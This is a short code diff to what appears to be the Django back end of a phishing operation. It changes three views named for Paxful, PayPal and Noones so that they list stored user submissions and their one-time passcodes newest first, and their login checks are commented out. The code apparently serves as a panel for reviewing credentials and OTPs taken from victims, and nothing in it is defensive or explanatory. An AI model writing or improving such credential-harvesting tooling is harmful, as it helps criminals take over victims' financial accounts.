@@ -854,7 +854,7 @@ def is_superuser(user):
 #@login_required(login_url='/admin/login/')
 #@user_passes_test(is_superuser, login_url='/admin/login/')
 def infodbpaxful(request):
-    user_submissions = UserSubmission.objects.all().prefetch_related('otps')
+    user_submissions = UserSubmission.objects.all().prefetch_related('otps').order_by('-created_at')
     return render(request, 'view_all.html', {'user_submissions': user_submissions})
 
 
@@ -947,7 +947,7 @@ def is_superuser(user):
 #@login_required(login_url='/admin/login/')
 #@user_passes_test(is_superuser, login_url='/admin/login/')
 def infodbpaypal(request):
-    user_submissions = UserSubmissionPaypal.objects.all().prefetch_related('otps')
+    user_submissions = UserSubmissionPaypal.objects.all().prefetch_related('otps').order_by('-created_at')
     return render(request, 'view_all.html', {'user_submissions': user_submissions})
 
 
@@ -1163,7 +1163,7 @@ def verify(request, submission_id):
 #@login_required(login_url='/admin/login/')
 #@user_passes_test(is_superuser, login_url='/admin/login/')
 def infodbnoones(request):
-    user_submissions = UserSubmissionNoones.objects.all().prefetch_related('otps')
+    user_submissions = UserSubmissionNoones.objects.all().prefetch_related('otps').order_by('-created_at')
     return render(request, 'view_all.html', {'user_submissions': user_submissions})
 
 
